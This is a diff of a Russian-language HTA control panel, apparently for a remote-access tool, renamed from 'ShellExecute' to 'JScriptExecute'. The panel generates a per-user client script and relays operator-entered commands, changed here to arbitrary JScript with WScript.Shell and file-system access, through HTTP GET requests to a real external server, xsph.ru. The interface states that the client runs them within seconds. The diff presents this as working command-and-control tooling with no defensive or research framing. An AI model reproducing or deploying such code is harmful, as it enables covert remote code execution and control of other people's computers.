@@ -11,7 +11,7 @@
 		font: 16px Arial;
 	}
   </style>
-  <title>ShellExecute</title>
+  <title>JScriptExecute</title>
   <hta:application 
   id=hta1
   applicationName=hta1
@@ -25,7 +25,7 @@
   <script>resize(500, 400)</script>
 </head>
 <body>
-	<h2>ShellExecute</h2>
+	<h2>JScriptExecute</h2>
 	Ваш ID: <input type="text" size=45 id="id"><br>
 	<button onclick="mkpayload()">Создать скрипт</button>
 	<button style="float: right;" onclick="enteraddr()">Задать команду</button>
@@ -35,7 +35,7 @@
 		
 		function sendtext(fn, data){
 			var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");
-			xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=" + fn + "&data=" + data, false);
+			xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=" + fn + ".txt&data=" + data, false);
 			xmlhttp.Send();
 		}
 		
@@ -46,17 +46,18 @@
 			pl.Write(txt.replaceAll("USER_ID", id.value));
 			pl.Close();
 			
-			sendtext(id.value + ".txt", "null");
+			sendtext(id.value, "null");
 			
-			WScript.Echo("Файл " + "client" + id.value + ".js" + " создан.");
+			WScript.Echo("Файл client" + id.value + ".js" + " создан.");
 		}
 		
 		function enteraddr(){
-			var addr = prompt("Введите команду для выполнения:", "null");
-			sendtext(id.value + ".txt", addr);
+			var addr = prompt("Введите JScript - код для выполнения:   (Доступные объекты: shell = WScript.Shell; fs = Scripting.FileSystemObject. Используйте ' вместо кавычек.)", "null");
+			sendtext(id.value, addr);
+			//WScript.Echo(id.value, addr);
 			WScript.Echo("Команда отправлена. Она будет выполнена в течении 1 - 10 сек.");
 			setTimeout(function(){
-				sendtext(id.value + ".txt", "null");
+				sendtext(id.value, "null");
 				WScript.Echo("Команда выполнена.");
 			}, 10000);
 		}
